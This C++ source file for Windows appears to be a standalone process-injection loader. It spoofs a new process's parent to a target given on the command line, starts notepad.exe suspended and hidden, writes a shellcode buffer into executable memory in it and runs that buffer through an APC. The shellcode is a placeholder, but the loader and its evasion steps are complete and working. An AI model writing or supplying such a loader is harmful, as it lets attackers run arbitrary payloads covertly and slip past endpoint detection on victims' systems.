#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int findMyProc(const char *procname) {
  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
  pe.dwSize = sizeof(PROCESSENTRY32);
  hResult = Process32First(hSnapshot, &pe);
  while (hResult) {
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }
  CloseHandle(hSnapshot);
  return pid;
}
int main(int argc, char* argv[]) {
  unsigned char shellcode[] =
"[Shellcode]";

  STARTUPINFOEXA si;
  PROCESS_INFORMATION pi;
  SIZE_T st;
  int pid = findMyProc(argv[1]);
  if (pid) {
    printf("PID = %d\n", pid);
  }
  HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid);
  ZeroMemory(&si, sizeof(STARTUPINFOEXA));
  InitializeProcThreadAttributeList(NULL, 1, 0, &st);
  si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, st);
  InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &st);
  UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);
  si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
  CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
  LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  SIZE_T *nb = 0;
  BOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)shellcode, sizeof(shellcode), nb);
  QueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);
  ResumeThread(pi.hThread);
  CloseHandle(pi.hThread);
  return 0;
}
